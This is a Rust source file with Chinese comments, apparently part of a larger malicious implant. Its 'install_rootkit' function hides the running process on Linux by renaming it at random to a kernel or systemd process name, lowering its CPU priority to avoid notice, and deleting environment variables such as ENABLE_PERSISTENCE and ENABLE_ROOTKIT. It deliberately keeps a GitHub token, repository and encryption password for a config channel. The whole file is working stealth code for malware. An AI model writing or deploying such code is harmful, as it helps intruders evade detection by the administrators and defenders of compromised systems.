// 隐蔽性增强 - 用户态实现
pub fn install_rootkit() -> Result<String, String> {
    #[cfg(unix)]
    {
        // 1. 进程名伪装
        set_process_name()?;

        // 2. 降低进程优先级（更隐蔽）
        lower_process_priority();

        // 3. 清理环境变量痕迹
        clean_environment();

        Ok("Stealth mode enabled".to_string())
    }

    #[cfg(not(unix))]
    {
        Err("Stealth mode only supported on Linux".to_string())
    }
}

#[cfg(unix)]
fn set_process_name() -> Result<(), String> {
    use std::ffi::CString;

    // 伪装成系统进程
    let fake_names = [
        "[kworker/0:0]",
        "[ksoftirqd/0]",
        "systemd-logind",
        "systemd-udevd",
        "systemd-journald",
    ];

    let fake_name = fake_names[rand::random::<usize>() % fake_names.len()];

    // 使用 prctl 修改进程名
    let c_name = CString::new(fake_name).map_err(|e| e.to_string())?;
    unsafe {
        libc::prctl(libc::PR_SET_NAME, c_name.as_ptr(), 0, 0, 0);
    }

    Ok(())
}

#[cfg(unix)]
fn lower_process_priority() {
    // 降低优先级，减少 CPU 占用，更难被发现
    unsafe {
        libc::nice(10);
    }
}

#[cfg(unix)]
fn clean_environment() {
    // 清理可能暴露身份的环境变量
    // 注意：不清理 GITHUB_TOKEN, GITHUB_REPO, ENCRYPTION_PASSWORD
    // 因为配置恢复功能需要这些变量
    let sensitive_vars = [
        "ENABLE_DEBUG",
        "ENABLE_PERSISTENCE",
        "ENABLE_ROOTKIT",
        "ACTIVE_HOURS",
    ];

    for var in &sensitive_vars {
        std::env::remove_var(var);
    }
}

pub fn uninstall_rootkit() -> Result<String, String> {
    Ok("Stealth mode disabled".to_string())
}
